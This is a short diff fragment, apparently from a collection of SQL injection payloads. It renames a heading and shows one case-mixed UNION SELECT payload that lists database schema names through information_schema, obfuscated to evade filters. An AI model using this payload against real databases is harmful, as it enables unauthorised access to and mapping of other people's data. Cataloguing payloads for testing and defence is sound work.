@@ -1,4 +1,4 @@
-# SQL Injection
+# SQL Injection Images
 
 ```
 1 UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
